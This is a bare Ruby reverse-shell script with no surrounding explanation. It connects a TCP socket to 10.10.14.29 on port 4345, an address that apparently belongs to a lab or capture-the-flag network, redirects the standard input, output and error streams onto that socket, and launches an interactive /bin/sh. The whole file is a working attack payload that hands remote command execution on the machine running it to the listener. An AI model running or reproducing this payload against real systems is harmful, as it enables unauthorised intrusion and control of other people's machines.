require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 4345, '10.10.14.29'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
